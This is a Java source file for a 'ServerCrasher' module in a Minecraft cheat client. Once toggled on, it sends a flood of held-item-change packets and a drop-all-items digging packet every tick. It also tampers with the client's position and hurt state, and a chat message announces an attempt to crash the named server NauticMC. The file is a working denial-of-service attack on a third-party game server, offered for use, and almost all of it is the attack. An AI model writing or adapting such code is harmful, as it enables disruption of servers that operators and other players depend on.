package me.GGEZ.module.misc;

import java.util.ArrayList;

import de.Hero.settings.Setting;
import me.GGEZ.GGEZ;
import me.GGEZ.module.Category;
import me.GGEZ.module.Module;
import net.minecraft.network.play.client.C07PacketPlayerDigging;
import net.minecraft.network.play.client.C09PacketHeldItemChange;
import net.minecraft.network.play.client.C0BPacketEntityAction.Action;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;

public class ServerCrasher extends Module{

	public ServerCrasher() {
		super("ServerCrasher", 0, Category.MISC);
	}
	
	public void setup() {
		ArrayList<String> options = new ArrayList<>();
        options.add("NauticMC");        
        GGEZ.instance.settingsManager.rSetting(new Setting("Server", this, "NauticMC", options));
	}
	
	@Override
	public void onUpdate() {
		if(this.isToggled()) {
			if(GGEZ.instance.settingsManager.getSettingByName("Server").getValString().equalsIgnoreCase("NauticMC")) {
				mc.thePlayer.hurtTime = 0;
				mc.thePlayer.onGround = false;
				mc.thePlayer.isInWeb = false;
				mc.thePlayer.setPosition(mc.thePlayer.posX, mc.thePlayer.posY + 0.01, mc.thePlayer.posZ);
				mc.thePlayer.setPosition(mc.thePlayer.posX, mc.thePlayer.posY - 0.01, mc.thePlayer.posZ);
				mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(1));
				mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(2));
				mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(3));
				mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(4));
				mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(5));
				mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(6));
				mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(7));
				mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(8));
				mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(9));
				C07PacketPlayerDigging.Action diggingAction = C07PacketPlayerDigging.Action.DROP_ALL_ITEMS;
				mc.thePlayer.sendQueue.addToSendQueue(new C07PacketPlayerDigging(diggingAction, BlockPos.ORIGIN, EnumFacing.DOWN));
//				mc.playerController.windowClick(mc.thePlayer.inventoryContainer.windowId, -999, 0, 0, mc.thePlayer);
				mc.thePlayer.setAIMoveSpeed(0);
				mc.thePlayer.onGround = true;
				mc.thePlayer.hurtTime = 1;
				
			}
		}
	}
	
	@Override
	public void onEnable() {
		GGEZ.instance.moduleManager.addChatMessage("attempting crash server: " + GGEZ.instance.settingsManager.getSettingByName("Server").getValString());
	}
	
	@Override
	public void onDisable() {
		
	}

}
